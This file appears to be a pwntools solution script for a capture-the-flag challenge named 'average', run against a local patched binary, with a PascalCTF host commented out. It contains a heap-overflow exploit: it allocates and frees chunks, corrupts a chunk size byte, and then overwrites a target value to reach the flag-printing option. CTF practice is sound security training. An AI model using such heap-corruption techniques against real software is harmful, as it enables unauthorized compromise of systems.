#!/usr/bin/env python3

from pwn import *


env = {
    "LD_LIBRARY_PATH": ".",
    "FLAG": "aaaaaaaaaaaaaaaaaaaaaaa"
}



def create(i, s, n, m):
    io.sendlineafter(b"Exit", b"1")
    io.sendlineafter(b"index", i)
    io.sendlineafter(b"length", s)
    io.sendlineafter(b"name", n)
    io.sendlineafter(b"message", m)

def delete(i):
    io.sendlineafter(b"Exit", b"2")
    io.sendlineafter(b"index", i)

def affiche():
    io.sendlineafter(b"Exit", b"3")


def end():
    io.sendlineafter(b"Exit", b"4")

def get_flag():
    io.sendlineafter(b"Exit", b"5")


io = process("./average_patched", env=env)
# io = connect("ahc.ctf.pascalctf.it", 9003)

create(b"0", b"0", b"A"*0x27, b"B"*32 + b"\x61")
create(b"1", b"0", b"A"*0x27, b"B"*32 + b"\x61")
create(b"2", b"0", b"A"*0x27, b"B"*32 + b"\x61")
create(b"3", b"0", b"A"*0x27, b"B"*32 + b"\x61")
create(b"4", b"0", b"A"*0x27, b"B"*32 + b"\x61")
delete(b"0")
delete(b"1")
delete(b"2")
delete(b"3")
delete(b"4")
create(b"0", b"16", b"D"*0x37, b"E"*0x18 + p64(0xdeadbeefcafebabe))


get_flag()
io.interactive()